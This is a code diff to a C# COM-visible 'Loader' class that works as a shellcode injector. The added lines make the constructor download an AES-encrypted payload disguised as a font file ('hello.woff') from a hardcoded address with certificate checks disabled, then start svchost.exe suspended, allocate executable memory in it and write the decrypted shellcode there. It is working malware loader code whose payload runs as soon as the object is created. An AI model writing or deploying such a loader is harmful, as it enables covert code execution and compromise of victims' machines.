@@ -23,12 +23,18 @@ using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Windows.Forms;
+using System.Security.Policy;
+using System.Text;
 
 [ComVisible(true)]
 public class Loader
 {
     public Loader() 
     {
+        byte[] AESKey = Encoding.ASCII.GetBytes("D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT");
+        byte[] AESIV = Encoding.ASCII.GetBytes("8y/B?E(G+KbPeShV");
+        this.DownloadAndExecute("https://192.168.8.205:8443/hello.woff", "svchost.exe", "", AESKey, AESIV);
     }
 
     private static string AESKey;
@@ -122,6 +128,7 @@ public class Loader
             String lpCurrentDirectory,
             [In] StartupInfo lpStartupInfo,
             out ProcessInformation lpProcessInformation
+
         );
 
     [DllImport("kernel32.dll")]
@@ -141,7 +148,7 @@ public class Loader
         Process.Start(path);
     }
 
-    public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
+    public void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
     {
         ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
         System.Net.WebClient client = new WebClientWithTimeout();
@@ -150,6 +157,7 @@ public class Loader
         List<byte> l = new List<byte> { };
         byte[] actual;
         byte[] compressed;
+        
         if (AESKey != null && AESIV != null)
         {
 
@@ -165,21 +173,21 @@ public class Loader
         else
         {
             compressed = encrypted;
-
         }
 
         byte[] sc = Decompress(compressed, CompressionAlgorithm);
         string binary = TargetBinary;
-
+        
         Int32 size = sc.Length;
         StartupInfo sInfo = new StartupInfo();
         sInfo.dwFlags = 0;
         ProcessInformation pInfo;
         string binaryPath = "C:\\Windows\\System32\\" + binary;
+ 
         IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
         IntPtr hProcess = pInfo.hProcess;
         IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
+        
         int test = 0;
         IntPtr size2 = new IntPtr(sc.Length);
         bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
@@ -226,7 +234,7 @@ public class Loader
     {
         byte[] key = AESKey;
         byte[] IV = AESIV;
-
+        
         using (Rijndael aesAlg = Rijndael.Create())
         {
             aesAlg.Key = key;
